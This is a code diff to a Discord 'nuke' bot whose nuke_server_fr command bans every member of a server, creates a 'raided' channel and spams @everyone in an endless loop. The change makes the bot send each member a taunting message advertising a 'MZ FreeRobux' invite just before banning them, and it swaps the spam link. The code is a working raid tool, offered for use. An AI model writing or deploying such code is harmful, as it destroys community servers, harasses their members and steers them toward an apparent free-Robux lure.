@@ -200,7 +200,11 @@ async def nuke_server_fr(ctx):
         newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
 
         async def ban(ctx, member: discord.Member, *, reason=None):
-            await member.ban()
+            await member.send(
+                f'Hello. You have been banned from {ctx.channel.guild.name} cuz THE SERVER GOT RAIDED LOL!!\n '
+                f'JOIN MZ FreeRobux TODAY! https://discord.gg/uAsCWzkNZd') 
+
+            await member.ban()  # Bans the member.
 
         for member in all_members_list:
             try:
@@ -212,7 +216,7 @@ async def nuke_server_fr(ctx):
 
         while True:
             await newchannel.send('**<@everyone> (who is still here lol) RAIDED BY MZ FreeRobux '
-                                  'https://discord.gg/cdJvU4QpTG. EZ Noobs**')
+                                  'https://discord.gg/uAsCWzkNZd. EZ Noobs**')
 
 
 bot.run(TOKEN)
